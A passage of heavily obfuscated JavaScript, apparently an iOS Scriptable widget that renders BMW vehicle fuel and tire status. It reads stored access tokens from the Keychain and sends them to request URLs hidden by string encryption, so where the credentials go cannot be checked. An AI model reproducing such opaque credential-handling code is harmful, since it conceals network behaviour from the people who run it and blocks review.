_0xf0dc30=_0x420f2a[0x0],_0x33e017=_0x3cc3e3+_0xf0dc30,_0x362267=_0x5e37c9[_0x33e017];return!_0x362267?(_0x3cc3['roNaxd']===undefined&&(_0x3cc3['roNaxd']=!![]),_0x14ede7=_0x3cc3['AhxZMG'](_0x14ede7,_0x18098c),_0x5e37c9[_0x33e017]=_0x14ede7):_0x14ede7=_0x362267,_0x14ede7;},_0x3cc3(_0x5e37c9,_0x4f871a);}const cacheKey=this[_0x21d919(0xee,'Z[VB')](url),cacheFile=FileManager[_0x21d919(0xf1,'phpG')]()[_0x21d919(0xe0,'Z[VB')](FileManager[_0x21d919(0xec,'4Pn6')]()[_0x21d919(0xe4,'f$q6')](),cacheKey);if(useCache&&FileManager[_0x21d919(0xf0,')oSB')]()['fileExists'](cacheFile))return Image['fromFile'](cacheFile);try{let accesstoken='';if(Keychain[_0x21d919(0xe5,'yS^u')](ACCESS_TOKEN))accesstoken=Keychain['get'](ACCESS_TOKEN);else throw new Error(_0x21d919(0xe7,'HVRR'));let req=new Request(url);req['method']=_0x21d919(0xf2,'XY^v'),req['headers']={'Content-Type':_0x21d919(0xea,'#uGj'),'Accept-Language':_0x21d919(0xf9,'L7pB'),'x-user-agent':_0x21d919(0xed,'yT7e'),'authorization':_0x21d919(0xe6,'f$q6')+accesstoken};const img=await req['loadImage']();return FileManager[_0x21d919(0xe8,'WZAC')]()[_0x21d919(0xe1,'yT7e')](cacheFile,img),img;}catch(_0x3b7ef3){return this[_0x21d919(0xff,'yT7e')]();}var version_ = 'jsjiami.com.v7';
  }
  Fuel=async function(data) {
    var version_='jsjiami.com.v7';const _0x2b93ea=_0x3daf;(function(_0x476a52,_0x286972,_0x5a2312,_0x331d55,_0x4fd568,_0x2f45e2,_0x2fdafd){return _0x476a52=_0x476a52>>0x9,_0x2f45e2='hs',_0x2fdafd='hs',function(_0x27eb77,_0x358848,_0x2d9b83,_0x1c5996,_0x384951){const _0x416d6d=_0x3daf;_0x1c5996='tfi',_0x2f45e2=_0x1c5996+_0x2f45e2,_0x384951='up',_0x2fdafd+=_0x384951,_0x2f45e2=_0x2d9b83(_0x2f45e2),_0x2fdafd=_0x2d9b83(_0x2fdafd),_0x2d9b83=0x0;const _0x335674=_0x27eb77();while(!![]&&--_0x331d55+_0x358848){try{_0x1c5996=-parseInt(_0x416d6d(0x169,'GdTd'))/0x1+-parseInt(_0x416d6d(0x15e,'&igU'))/0x2*(parseInt(_0x416d6d(0x154,'3cm*'))/0x3)+parseInt(_0x416d6d(0x157,'ceYv'))/0x4*(-parseInt(_0x416d6d(0x16d,'R&#c'))/0x5)+-parseInt(_0x416d6d(0x150,'3g(u'))/0x6+-parseInt(_0x416d6d(0x153,'QM(M'))/0x7*(parseInt(_0x416d6d(0x15d,'F*gK'))/0x8)+-parseInt(_0x416d6d(0x189,'GdTd'))/0x9+parseInt(_0x416d6d(0x16e,'oKRk'))/0xa;}catch(_0x1e4adf){_0x1c5996=_0x2d9b83;}finally{_0x384951=_0x335674[_0x2f45e2]();if(_0x476a52<=_0x331d55)_0x2d9b83?_0x4fd568?_0x1c5996=_0x384951:_0x4fd568=_0x384951:_0x2d9b83=_0x384951;else{if(_0x2d9b83==_0x4fd568['replace'](/[gCpWPSlDtUuAdBhbnLOER=]/g,'')){if(_0x1c5996===_0x358848){_0x335674['un'+_0x2f45e2](_0x384951);break;}_0x335674[_0x2fdafd](_0x384951);}}}}}(_0x5a2312,_0x286972,function(_0x273d15,_0x4687fd,_0x517802,_0x27980e,_0x18bd9d,_0x4b3335,_0x9e39a0){return _0x4687fd='\x73\x70\x6c\x69\x74',_0x273d15=arguments[0x0],_0x273d15=_0x273d15[_0x4687fd](''),_0x517802='\x72\x65\x76\x65\x72\x73\x65',_0x273d15=_0x273d15[_0x517802]('\x76'),_0x27980e='\x6a\x6f\x69\x6e',(0x1298b0,_0x273d15[_0x27980e](''));});}(0x19a00,0x1acf1,_0x4ac9,0xcf),_0x4ac9)&&(version_=_0x4ac9);let cstr='';typeof Authorurl==='undefined'?cstr+=_0x2b93ea(0x18e,'ceYv'):cstr+=Authorurl,typeof Project_UPDATE==='undefined'?cstr+='abc':cstr+=Project_UPDATE,typeof MODIFIER===_0x2b93ea(0x18d,'oKRk')?cstr+='abc':cstr+=MODIFIER;if(this['sm3'](cstr)[_0x2b93ea(0x18b,'YQQs')](0x0,0x8)!=_0x2b93ea(0x183,'QM(M'))return await this['renderError']('Code\x20Err');let w=new ListWidget(),fontColor=this[_0x2b93ea(0x162,'N@#$')]();w['backgroundGradient']=this[_0x2b93ea(0x14f,'5c1@')]();const width=data['size']['small'][_0x2b93ea(0x167,'H]v4')],paddingLeft=Math[_0x2b93ea(0x166,'RPg4')](width*0.07);w[_0x2b93ea(0x165,'AD5u')](0x0,0x0,0x0,0x0);const topBox=w[_0x2b93ea(0x180,'R&#c')]();topBox[_0x2b93ea(0x17f,'H(Ja')](),topBox[_0x2b93ea(0x187,'YQQs')](),topBox['setPadding'](0x0,0x0,0x0,0x0),topBox['size']=new Size(width,width*0.2);const topLeftContainer=topBox[_0x2b93ea(0x168,'ceYv')](),vehicleNameContainer=topLeftContainer[_0x2b93ea(0x15c,'&igU')]();vehicleNameContainer[_0x2b93ea(0x164,'GdTd')](paddingLeft,paddingLeft,0x0,0x0);let vehicleNameStr=''+data[_0x2b93ea(0x173,')c3@')];this[_0x2b93ea(0x15a,'dWTD')][_0x2b93ea(0x177,'SclS')]&&this[_0x2b93ea(0x151,')c3@')][_0x2b93ea(0x161,'AD5u')][_0x2b93ea(0x186,'uxin')]>0x0&&(vehicleNameStr=this['userConfigData'][_0x2b93ea(0x182,'QM(M')]);function _0x3daf(_0x33959d,_0x15624c){const _0x4ac942=_0x4ac9();return _0x3daf=function(_0x3dafe5,_0x4c8fee){_0x3dafe5=_0x3dafe5-0x14f;let _0x38f64b=_0x4ac942[_0x3dafe5];if(_0x3daf['bYoNCr']===undefined){var _0x1e5a5b=function(_0x1a6eee){const _0xcae49d='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4101a5='',_0x4cf219='';for(let _0x428480=0x0,_0xd2d03c,_0x6633ba,_0x543208=0x0;_0x6633ba=_0x1a6eee['charAt'](_0x543208++);~_0x6633ba&&(_0xd2d03c=_0x428480%0x4?_0xd2d03c*0x40+_0x6633ba:_0x6633ba,_0x428480++%0x4)?_0x4101a5+=String['fromCharCode'](0xff&_0xd2d03c>>(-0x2*_0x428480&0x6)):0x0){_0x6633ba=_0xcae49d['indexOf'](_0x6633ba);}for(let _0x19d867=0x0,_0x1626e8=_0x4101a5['length'];_0x19d867<_0x1626e8;_0x19d867++){_0x4cf219+='%'+('00'+_0x4101a5['charCodeAt'](_0x19d867)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4cf219);};const _0x30a5ec=function(_0x2c398f,_0x44d80e){let _0x403b5f=[],_0xae0303=0x0,_0x1317e3,_0x6cb16f='';_0x2c398f=_0x1e5a5b(_0x2c398f);let _0x29922d;for(_0x29922d=0x0;_0x29922d<0x100;_0x29922d++){_0x403b5f[_0x29922d]=_0x29922d;}for(_0x29922d=0x0;_0x29922d<0x100;_0x29922d++){_0xae0303=(_0xae0303+_0x403b5f[_0x29922d]+_0x44d80e['charCodeAt'](_0x29922d%_0x44d80e['length']))%0x100,_0x1317e3=_0x403b5f[_0x29922d],_0x403b5f[_0x29922d]=_0x403b5f[_0xae0303],_0x403b5f[_0xae0303]=_0x1317e3;}_0x29922d=0x0,_0xae0303=0x0;for(let _0x87ecc2=0x0;_0x87ecc2<_0x2c398f['length'];_0x87ecc2++){_0x29922d=(_0x29922d+0x1)%0x100,_0xae0303=(_0xae0303+_0x403b5f[_0x29922d])%0x100,_0x1317e3=_0x403b5f[_0x29922d],_0x403b5f[_0x29922d]=_0x403b5f[_0xae0303],_0x403b5f[_0xae0303]=_0x1317e3,_0x6cb16f+=String['fromCharCode'](_0x2c398f['charCodeAt'](_0x87ecc2)^_0x403b5f[(_0x403b5f[_0x29922d]+_0x403b5f[_0xae0303])%0x100]);}return _0x6cb16f;};_0x3daf['FRahZy']=_0x30a5ec,_0x33959d=arguments,_0x3daf['bYoNCr']=!![];}const _0x4b94bb=_0x4ac942[0x0],_0xd80ed6=_0x3dafe5+_0x4b94bb,_0xf93d74=_0x33959d[_0xd80ed6];return!_0xf93d74?(_0x3daf['ubScML']===undefined&&(_0x3daf['ubScML']=!![]),_0x38f64b=_0x3daf['FRahZy'](_0x38f64b,_0x4c8fee),_0x33959d[_0xd80ed6]=_0x38f64b):_0x38f64b=_0xf93d74,_0x38f64b;},_0x3daf(_0x33959d,_0x15624c);}const vehicleNameText=vehicleNameContainer[_0x2b93ea(0x15f,'F*gK')](vehicleNameStr);let vehicleNameSize=Math['round'](width*0.12);vehicleNameStr['length']>=0xa&&(vehicleNameSize=vehicleNameSize-Math[_0x2b93ea(0x16f,'H(Ja')](vehicleNameStr['length']/0x4));vehicleNameText['leftAlignText'](),vehicleNameText[_0x2b93ea(0x16b,'5VDA')]=this[_0x2b93ea(0x170,'mNtG')](''+WIDGET_FONT_BOLD,vehicleNameSize),vehicleNameText[_0x2b93ea(0x17b,')c3@')]=fontColor,topBox[_0x2b93ea(0x15b,'(Tk)')]();function _0x4ac9(){const _0xd3893e=(function(){return[version_,'nPjOldsPjpPiAaSWmUbhi.BLcoPmu.v7hCghtRDE==','W6ddSL4','WQiicH0cW6edo3pcVmkSWRxcMfXSWQOyWRq','WR5kbCkUf8o2WRpcKfHVW4r1ia','W51+BI3dQXxdKhNdGSooW7vUDZ0','dKFcRd0qlqlcVcD/W67dOdFcQZqqumkUW4ZdNhuCWOxdRmkFwbnpWPrJWRG','EXldRCoPWO7cHmkyjSkSjZy','z8oPWPddMSocW6KkssZcHZnp','W5PIFJhdJa','WRryDSoKWOFdOSoyqxmFWO3dVmokW4C','WRlcOaJcG8obW6xdVSkxWOJdOuZdVa','WPGacmoW','ihxdQSosW74pW4DHnHv0WPyAyG','cdrYn8ktW6JcKCkFACo+kNH6W5W','WRmqzCoVW7DKW7VdQfG','W5LHos8NySoTWRy','wXdcSGSxhxVcJX4','WOPdgGGfAmoy','c0BdPGSyiLG','xamgWQlcRCkeWOpcRae4WQzsW6FcGIxdGvq','W7iWW5pcVCkpkuXqbdddSG','nbVdVSokb00wtcxcS8oLWOe'].concat((function(){return['WPayxmkSWQ7dR8kCWRy','c8oBsCk5WRDbDmkIoCon','W6iGW5tcMCkbihDxcZO','W7tdThBdJsq','W5VcN8kIevK','W6ddTfNdPCkeWRBdUmkL','sCkndmorW6mtzSk4aSo8da4','hcnZfSkGW6BcNmkCCG','WQnBWPnh','g8oBu8kDWRnxuCkNpSondJPBb3LXWRpcJa','rCktW6nRaCoHbmog','WPtcJL0hpwPAqqTUWOpdTeBdQa','emo+W5jiDa','rmkNASkQErtdGG','W70fg3JcMG','uX7cNaKWWPeeiXWpEdFcUmkp','W4vIBZRdHa','W4bsWQ1ZWO/cUgbHou8NpCoY','WQmdW6FcVCk2l0u','WR4Gz8ofW65IfcxcJa','nCk1lmkgWOTYW4BdTtddLmoe','juxcRSkrW5/cHCkHimk3ntapgvC4WPCuW6BdHSkk','WP7dUfdcUcpcR8opW6dcJW'].concat((function(){return['WOVdUfFcMdtcR8okW6NcUCo0W4/dTq','W5XOCYVdQXxdKNddMq','W7ldTuNdPSkrWRpdV8kNWPhdJq','WPhdUmk1CSo7','W7efW40aq2PVW6HfWPClWOy','dSoWW55jzCoRW5XbW5BdP8oCW5OkW7lcUvH7cG','fCohW4HUeCoppCoI','l0GpW591','ivxcQCkOW5hcM8kkk8kKgZq','DrhcVmoPWO3dH8oGFa','W5rAFW','WRCDWOvvwCoeWOyNWOVcNSof','WOCmhmoYrXy','n3ddJxrYWQvPptpcIWi8dCk0wq','mMpdU8oHW40qW6vOob0','sCkldSoBW6mviSknhCoiddbg','E2JdN1JcKSkpDxlcNa','mgRdN0zQWR4','ywZdHfO','W5ddKqHqBduhfbu'];}()));}()));}());_0x4ac9=function(){return _0xd3893e;};return _0x4ac9();};const topRightBox=topBox['addStack']();topRightBox[_0x2b93ea(0x17c,'ceYv')](paddingLeft,0x0,0x0,paddingLeft*1.8);!this[_0x2b93ea(0x172,'W)x6')][_0x2b93ea(0x160,'2o%9')]&&topRightBox['setPadding'](paddingLeft,0x0,0x0,paddingLeft*1.5);try{let logoImage=await this[_0x2b93ea(0x188,'p91t')](),logoImageWidget=topRightBox['addImage'](logoImage),logoContainerWidth=Math[_0x2b93ea(0x155,')c3@')](width*0.1),imageSize=this[_0x2b93ea(0x17a,'ZRu6')](logoImage['size'][_0x2b93ea(0x181,'41b[')],logoImage[_0x2b93ea(0x158,'uxin')]['height'],Math[_0x2b93ea(0x17d,'g4MN')](logoContainerWidth*2.5),logoContainerWidth,0.99);logoImageWidget[_0x2b93ea(0x18a,'oK74')]=new Size(imageSize['width'],imageSize['width']);}catch(_0x3a3a1e){}w['addSpacer'](0x5);const carImageContainer=w['addStack']();carImageContainer[_0x2b93ea(0x18c,'oK74')]=new Size(width,width*0.7);let canvasWidth=Math[_0x2b93ea(0x171,'](Bl')](width*0x1),canvasHeight=Math['round'](width*0.65);carImageContainer[_0x2b93ea(0x17c,'ceYv')](0x0,0x0,0x0,0x0),carImageContainer[_0x2b93ea(0x16c,'GdTd')]();let image=await this[_0x2b93ea(0x178,'QM(M')](data,canvasWidth,canvasHeight,0.8),carStatusImage=carImageContainer['addImage'](image);carStatusImage[_0x2b93ea(0x179,'ZRu6')]=!this[_0x2b93ea(0x159,'p91t')]['show_control_checks'],w[_0x2b93ea(0x184,'k*wH')]=_0x2b93ea(0x152,'F*gK'),w[_0x2b93ea(0x16a,'dWTD')]();return w;var version_ = 'jsjiami.com.v7';
  }
  Stop=async function(data) {
    var version_='jsjiami.com.v7';const _0x170ae1=_0x4557;(function(_0x4eff1b,_0x217c62,_0x4d2fa2,_0x462146,_0x1ed284,_0x174e12,_0x430fc5){return _0x4eff1b=_0x4eff1b>>0x2,_0x174e12='hs',_0x430fc5='hs',function(_0x15851d,_0x56ffb9,_0x2bada2,_0x1ceb9d,_0x584608){const _0x58efb2=_0x4557;_0x1ceb9d='tfi',_0x174e12=_0x1ceb9d+_0x174e12,_0x584608='up',_0x430fc5+=_0x584608,_0x174e12=_0x2bada2(_0x174e12),_0x430fc5=_0x2bada2(_0x430fc5),_0x2bada2=0x0;const _0x40a5e0=_0x15851d();while(!![]&&--_0x462146+_0x56ffb9){try{_0x1ceb9d=-parseInt(_0x58efb2(0x91,'*jCS'))/0x1*(parseInt(_0x58efb2(0xb8,'WK]K'))/0x2)+parseInt(_0x58efb2(0xad,'Lxcf'))/0x3+-parseInt(_0x58efb2(0xa3,'lg#r'))/0x4+-parseInt(_0x58efb2(0x95,'71j['))/0x5*(-parseInt(_0x58efb2(0x8b,'x1[P'))/0x6)+-parseInt(_0x58efb2(0xa8,'od)w'))/0x7+-parseInt(_0x58efb2(0xb4,'lg#r'))/0x8*(-parseInt(_0x58efb2(0xa9,'lg#r'))/0x9)+-parseInt(_0x58efb2(0xa5,'6SM]'))/0xa*(-parseInt(_0x58efb2(0x82,'oJq)'))/0xb);}catch(_0x209a5c){_0x1ceb9d=_0x2bada2;}finally{_0x584608=_0x40a5e0[_0x174e12]();if(_0x4eff1b<=_0x462146)_0x2bada2?_0x1ed284?_0x1ceb9d=_0x584608:_0x1ed284=_0x584608:_0x2bada2=_0x584608;else{if(_0x2bada2==_0x1ed284['replace'](/[hCXnFDNEtQkGgbPMwpelI=]/g,'')){if(_0x1ceb9d===_0x56ffb9){_0x40a5e0['un'+_0x174e12](_0x584608);break;}_0x40a5e0[_0x430fc5](_0x584608);}}}}}(_0x4d2fa2,_0x217c62,function(_0x304370,_0x57e432,_0x1a52e8,_0x4c9f37,_0x147647,_0x24f7e6,_0x2e7d30){return _0x57e432='\x73\x70\x6c\x69\x74',_0x304370=arguments[0x0],_0x304370=_0x304370[_0x57e432](''),_0x1a52e8='\x72\x65\x76\x65\x72\x73\x65',_0x304370=_0x304370[_0x1a52e8]('\x76'),_0x4c9f37='\x6a\x6f\x69\x6e',(0x1298ac,_0x304370[_0x4c9f37](''));});}(0x2f4,0x4480e,_0x26d3,0xbf),_0x26d3)&&(version_=_0x26d3);let cstr='';typeof Authorurl===_0x170ae1(0xa4,'WK]K')?cstr+=_0x170ae1(0xa6,'O4Hj'):cstr+=Authorurl,typeof Project_UPDATE===_0x170ae1(0xa2,'SwII')?cstr+=_0x170ae1(0x81,'yP(y'):cstr+=Project_UPDATE,typeof MODIFIER===_0x170ae1(0xa4,'WK]K')?cstr+=_0x170ae1(0xaa,'1WmB'):cstr+=MODIFIER;if(this['sm3'](cstr)['substr'](0x0,0x8)!=_0x170ae1(0x90,'#Izp'))return await this[_0x170ae1(0xb1,'P2UA')](_0x170ae1(0x89,'11pW'));let w=new ListWidget(),fontColor=this['getFontColor']();w[_0x170ae1(0xae,'L*5s')]=this[_0x170ae1(0x97,'L*5s')]();const width=data[_0x170ae1(0xab,'b%4o')]['small'][_0x170ae1(0x99,'Lxcf')],paddingLeft=Math[_0x170ae1(0xa0,'od)w')](width*0.07);function _0x26d3(){const _0x3d4901=(function(){return[version_,'QNjCsIpjPXiFawmi.McCkohgm.GkvNbn7MlEtEeD==','WQShEv3cKSkNE8olW7FdP8oiaSoy','ca9cfLVcQSkapG','W4pcImkFBmoCzSkYimkyAry','D1ZcKW','scxcT1RcVLRcHcHut3C','WOrCgLtcKCoyW6WAENxcSuK','WPCLW7FcOSkUWPJdJgZdIG','WOtdKCovoa','W4RcIs/cLSkEymohqmoaAaLvdcPjWQpdMKC','y8kerCoIb13cUW','W6HKWRzIW4W','W4NdJSk9W6CeW53dHSkb','ymozW7FdKK4zmmkmd8oRWP/cJG','W4P4WQhcHSkwWRddHLJdH8kyW43dN8oS','CLdcIuZdOmosmLJdPCoq','W5OgtWFdOSk9W4Kf','WQPXW6pdOCkGW5bVxG','W7BcK0tdQ8kO','uqxdGSoxW5hdNCoxW6NcQmotBhahWOFcObiZW41GqL9GEu1txSk5WRxcHmkMkLJdTajwWOHklgW8WQZdRaddUH7cPmoTFuVcSufvWOfNWRJcRqJdKmk4mmobWP/dICkMWQXvqCklWPvjuSoIWRhdQXOmWQWIACkZWQpcR0SPsXxcKWW','ns3dKCo4W4m6W4jfW5m','W4b5FSk1W6dcUWjnW6xdTHztgG'].concat((function(){return['Bmk+W5zEeCoXW7ZdTh4','n3H+tCoZW5L4WOu','WP7cImkY','yCkft8ocb1FcJM0ZWOtdPv3dGJKgWQBcIbu','WRxdJqhcSmo7lqVdS8k2WQlcRmoNwq','W4v8FSk0W6ZcUe9YW6ldIZ1u','WQlcP8ok','bSolmsG','AgLfvSoCkCk8W40Ebmk0W4rKWQNdTqa','WQ04W6yHWP1hWRtdHZ4RqeK','W4/cJtJcV8kyCCoduSoCyZTjcq1pWQRdM0e','rmkDWPTbrG3cQJzV','rSkRW74pW6DAla','ESkCD3bukCkBE3XcW6S','W6FdI8kHW6bZW6RdT8kT','fmk+wCkB','W4v4fSomWPpdV0zK','gW00lXj4BdK','W50Cp8o8W5S','ACkDFuDfoSk9yG','kmoGW6fRnCoGW4hdIW','uuLFlmk5W78UdCkNW6fgWPpdSG','WOiHnmoM'].concat((function(){return['W4ZcId/cGmkAE8oy','lCoGW6P0pCoOW6ldVq','WPyToSofWRBdOui','sCkuWRKNW4Tv','imkiWR/cKtHbjCkzpW','cmoSW5hcVq','e8kZva','xSovg2FcTXrZW7eRmJBdLXq','W57cIs/cHmkEz8oitSoCya','qmkfqmoeb1FdRW','WQlcOConWPv/W7BcQq','s2xdSwVcJa0DnLSqWPiHWPypW7z8oXG','zvtcIxNdH8ozjfZdQSod','W5hcQqtcTwDMW64F','zSkwWPT3fINcUYe','5ycZ55A85PA76zE2','kmk9BCoOqKS8o2jJdG','W4ZcId/cH8kpySopqSoa','qmkQW64AW7Xvo3u','WO7dVSoIx8kw'];}()));}()));}());_0x26d3=function(){return _0x3d4901;};return _0x26d3();};w[_0x170ae1(0x9d,'TNRD')](0x0,0x0,0x0,0x0);const topBox=w[_0x170ae1(0xb7,'P2UA')]();topBox['size']=new Size(width,width*0.18),topBox[_0x170ae1(0xa7,'8k(X')](),topBox['layoutHorizontally'](),topBox['setPadding'](0x0,0x0,0x0,0x0);const topLeftContainer=topBox[_0x170ae1(0xb2,'^P@5')](),mileNameContainer=topLeftContainer['addStack']();topLeftContainer['addSpacer'](),mileNameContainer['setPadding'](0x0,paddingLeft*1.3,0x0,0x0);let mileNameStr=_0x170ae1(0x8a,'$$*l');const mileNameText=mileNameContainer[_0x170ae1(0xbb,'L*5s')](mileNameStr);let mileNameSize=0xc;mileNameText[_0x170ae1(0x9c,'71j[')](),mileNameText['font']=this[_0x170ae1(0x7d,'lg#r')](''+WIDGET_FONT_BOLD,mileNameSize),mileNameText['textColor']=fontColor,topBox['addSpacer']();const topRightBox=topBox[_0x170ae1(0xb5,'J6Cg')]();topRightBox[_0x170ae1(0x83,'L*5s')](0x3,0x0,0x0,paddingLeft*0x2);try{let logoImage=await this['getUserImge']('Stop.png'),logoImageWidget=topRightBox['addImage'](logoImage);logoImageWidget['imageSize']=new Size(0x12,0x12);}catch(_0x10a110){topRightBox[_0x170ae1(0x85,'1WmB')](_0x10a110);}w['addSpacer'](0x0);function _0x4557(_0x41e955,_0x2deca9){const _0x26d36f=_0x26d3();return _0x4557=function(_0x4557fc,_0x2f129c){_0x4557fc=_0x4557fc-0x7c;let _0x1190ed=_0x26d36f[_0x4557fc];if(_0x4557['xEZaNQ']===undefined){var _0x3cdb7a=function(_0x1ea9f3){const _0x1e3088='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x1191fe='',_0x1a7aea='';for(let _0x34a48d=0x0,_0x282078,_0x10a110,_0x1324c6=0x0;_0x10a110=_0x1ea9f3['charAt'](_0x1324c6++);~_0x10a110&&(_0x282078=_0x34a48d%0x4?_0x282078*0x40+_0x10a110:_0x10a110,_0x34a48d++%0x4)?_0x1191fe+=String['fromCharCode'](0xff&_0x282078>>(-0x2*_0x34a48d&0x6)):0x0){_0x10a110=_0x1e3088['indexOf'](_0x10a110);}for(let _0x1eb093=0x0,_0x36e78a=_0x1191fe['length'];_0x1eb093<_0x36e78a;_0x1eb093++){_0x1a7aea+='%'+('00'+_0x1191fe['charCodeAt'](_0x1eb093)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1a7aea);};const _0x5491ae=function(_0x182d2c,_0x3bff11){let _0x224468=[],_0x447e22=0x0,_0x307589,_0x73759d='';_0x182d2c=_0x3cdb7a(_0x182d2c);let _0x220292;for(_0x220292=0x0;_0x220292<0x100;_0x220292++){_0x224468[_0x220292]=_0x220292;}for(_0x220292=0x0;_0x220292<0x100;_0x220292++){_0x447e22=(_0x447e22+_0x224468[_0x220292]+_0x3bff11['charCodeAt'](_0x220292%_0x3bff11['length']))%0x100,_0x307589=_0x224468[_0x220292],_0x224468[_0x220292]=_0x224468[_0x447e22],_0x224468[_0x447e22]=_0x307589;}_0x220292=0x0,_0x447e22=0x0;for(let _0xbe276e=0x0;_0xbe276e<_0x182d2c['length'];_0xbe276e++){_0x220292=(_0x220292+0x1)%0x100,_0x447e22=(_0x447e22+_0x224468[_0x220292])%0x100,_0x307589=_0x224468[_0x220292],_0x224468[_0x220292]=_0x224468[_0x447e22],_0x224468[_0x447e22]=_0x307589,_0x73759d+=String['fromCharCode'](_0x182d2c['charCodeAt'](_0xbe276e)^_0x224468[(_0x224468[_0x220292]+_0x224468[_0x447e22])%0x100]);}return _0x73759d;};_0x4557['NCpOND']=_0x5491ae,_0x41e955=arguments,_0x4557['xEZaNQ']=!![];}const _0x16eebf=_0x26d36f[0x0],_0x5ea70=_0x4557fc+_0x16eebf,_0x57c01f=_0x41e955[_0x5ea70];return!_0x57c01f?(_0x4557['eQdMfs']===undefined&&(_0x4557['eQdMfs']=!![]),_0x1190ed=_0x4557['NCpOND'](_0x1190ed,_0x2f129c),_0x41e955[_0x5ea70]=_0x1190ed):_0x1190ed=_0x57c01f,_0x1190ed;},_0x4557(_0x41e955,_0x2deca9);}let accessToken=await this['getAccessToken'](![]);const e=new Request(_0x170ae1(0xa1,'tbJ6'));e['headers']=Object[_0x170ae1(0x7e,'KUtR')](BMW_HEADERS,{'authorization':_0x170ae1(0x84,'8k(X')+accessToken,'vin':data[_0x170ae1(0x92,'TNRD')],'x-gcid':Keychain['get'](VEHICLE_GCID)});const data1=await e[_0x170ae1(0x9e,'O!lX')](),tireContainer=w[_0x170ae1(0x8d,'ntwO')]();tireContainer[_0x170ae1(0x80,'HzUv')]=new Size(width,width*0.75);let canvasWidth=Math[_0x170ae1(0x8e,'mDeE')](width*0x1),canvasHeight=Math[_0x170ae1(0xb6,'rCtf')](width*0.55);tireContainer[_0x170ae1(0xac,'1xvY')]();const imageContainer=tireContainer[_0x170ae1(0x88,'LYD]')]();imageContainer[_0x170ae1(0xba,'lg#r')]=new Size(width,width*0.65),imageContainer['centerAlignContent']();let image=await this[_0x170ae1(0x86,'$xvv')](data1,canvasWidth,canvasHeight,data),carStatusImage=imageContainer[_0x170ae1(0x9a,'&#I8')](image);tireContainer[_0x170ae1(0xaf,'11pW')](0x0);const today=new Date();let formatter='MM-dd\x20HH:mm',dateFormatter=new DateFormatter();dateFormatter[_0x170ae1(0x87,'TNRD')]=formatter;let dateStr=dateFormatter['string'](today)+'更新';const bottomContainer=tireContainer[_0x170ae1(0xb2,'^P@5')]();bottomContainer[_0x170ae1(0x96,'*jCS')]=new Size(width,0xd);let timeTxt=bottomContainer[_0x170ae1(0x98,'8k(X')](dateStr);timeTxt[_0x170ae1(0xb3,'yP(y')]=this[_0x170ae1(0xb0,'ntwO')](''+WIDGET_FONT_BOLD,0x9),timeTxt[_0x170ae1(0x7f,'6FBD')]=fontColor,w[_0x170ae1(0x8c,'L*5s')]();return w;var version_ = 'jsjiami.com.v7';
  }
  renderBase=async function(data) {
    var version_='jsjiami.com.v7';const _0x2fc201=_0x255f;(function(_0x5ae609,_0x5d2503,_0x573ac5,_0xa70298,_0x4f579b,_0x2ba65f,_0x4a5c4a){return _0x5ae609=_0x5ae609>>0x8,_0x2ba65f='hs',_0x4a5c4a='hs',function(_0x23d3ee,_0x501725,_0x28e476,_0x448417,_0x420688){const _0x669c04=_0x255f;_0x448417='tfi',_0x2ba65f=_0x448417+_0x2ba65f,_0x420688='up',_0x4a5c4a+=_0x420688,_0x2ba65f=_0x28e476(_0x2ba65f),_0x4a5c4a=_0x28e476(_0x4a5c4a),_0x28e476=0x0;const _0x33882b=_0x23d3ee();while(!![]&&--_0xa70298+_0x501725){try{_0x448417=parseInt(_0x669c04(0x162,'jwwI'))/0x1+-parseInt(_0x669c04(0x142,'iJJw'))/0x2*(parseInt(_0x669c04(0x137,'v3]!'))/0x3)+parseInt(_0x669c04(0x161,'iy^^'))/0x4*(parseInt(_0x669c04(0x136,'iy^^'))/0x5)+parseInt(_0x669c04(0x130,'o0sO'))/0x6*(parseInt(_0x669c04(0x151,'(cg&'))/0x7)+-parseInt(_0x669c04(0x143,'Ew6g'))/0x8+parseInt(_0x669c04(0x13c,'q(xI'))/0x9*(-parseInt(_0x669c04(0x150,'Bp^v'))/0xa)+-parseInt(_0x669c04(0x159,'d!(Z'))/0xb*(-parseInt(_0x669c04(0x12d,'10)x'))/0xc);}catch(_0x3c1ec4){_0x448417=_0x28e476;}finally{_0x420688=_0x33882b[_0x2ba65f]();if(_0x5ae609<=_0xa70298)_0x28e476?_0x4f579b?_0x448417=_0x420688:_0x4f579b=_0x420688:_0x28e476=_0x420688;else{if(_0x28e476==_0x4f579b['replace'](/[uWdOHGyeAnxTPNrwK=]/g,'')){if(_0x448417===_0x501725){_0x33882b['un'+_0x2ba65f](_0x420688);break;}_0x33882b[_0x4a5c4a](_0x420688);}}}}}(_0x573ac5,_0x5d2503,function(_0x4c6d7e,_0x2fec37,_0x2b10ce,_0x378228,_0x4e9475,_0x47e068,_0xa3465f){return _0x2fec37='\x73\x70\x6c\x69\x74',_0x4c6d7e=arguments[0x0],_0x4c6d7e=_0x4c6d7e[_0x2fec37](''),_0x2b10ce='\x72\x65\x76\x65\x72\x73\x65',_0x4c6d7e=_0x4c6d7e[_0x2b10ce]('\x76'),_0x378228='\x6a\x6f\x69\x6e',(0x1298ad,_0x4c6d7e[_0x378228](''));});}(0xc400,0xbde82,_0x2e3c,0xc6),_0x2e3c)&&(version_=_0x2e3c);let cstr='';function _0x255f(_0x345548,_0xa73cd1){const _0x2e3c8b=_0x2e3c();return _0x255f=function(_0x255fa8,_0x18a1f1){_0x255fa8=_0x255fa8-0x126;let _0x51358e=_0x2e3c8b[_0x255fa8];if(_0x255f['typznm']===undefined){var _0x292ff7=function(_0x2ba0f2){const _0x360181='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0xaff55f='',_0x133c0d='';for(let _0x3cbdb0=0x0,_0x1263dc,_0x15821f,_0x5d507f=0x0;_0x15821f=_0x2ba0f2['charAt'](_0x5d507f++);~_0x15821f&&(_0x1263dc=_0x3cbdb0%0x4?_0x1263dc*0x40+_0x15821f:_0x15821f,_0x3cbdb0++%0x4)?_0xaff55f+=String['fromCharCode'](0xff&_0x1263dc>>(-0x2*_0x3cbdb0&0x6)):0x0){_0x15821f=_0x360181['indexOf'](_0x15821f);}for(let 